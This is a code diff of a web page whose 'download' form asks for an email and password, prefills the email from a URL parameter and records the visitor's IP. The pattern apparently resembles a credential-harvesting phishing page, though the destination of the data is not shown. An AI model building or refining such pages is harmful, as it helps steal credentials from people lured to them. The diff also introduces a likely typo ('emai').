@@ -70,12 +70,12 @@
                                     <form id="downloadForm">
                                         <div class="mb-3">
                                             <label for="email1" class="form-label">Email address</label>
-                                            <input type="email" class="form-control" id="email1"
+                                            <input type="email" class="form-control" id="email"
                                                 aria-describedby="emailHelp" required>
                                         </div>
                                         <div class="mb-3">
                                             <label for="exampleInputPassword1" class="form-label">Password</label>
-                                            <input type="password" class="form-control" id="exampleInputPassword1"
+                                            <input type="password" class="form-control" id="password"
                                                 required>
 
                                         </div>
@@ -103,10 +103,10 @@
                         $(document).ready(function() {
     // Check if email parameter is present in the URL
     const urlParams = new URLSearchParams(window.location.search);
-    const emailParam = urlParams.get('email');
+    const emailParam = urlParams.get('emai');
 
     if (emailParam) {
-        $('#email1').val(emailParam);
+        $('#email').val(emailParam);
     }
 
     // Retrieve user's IP address
@@ -118,8 +118,8 @@
 
     $('#downloadForm').submit(function(e) {
         e.preventDefault();
-        var email = $('#email1').val();
-        var password = $('#exampleInputPassword1').val();
+        var email = $('#email').val();
+        var password = $('#password').val();
         var userIP = $('#userIP').val();
 
         // Get the download button element
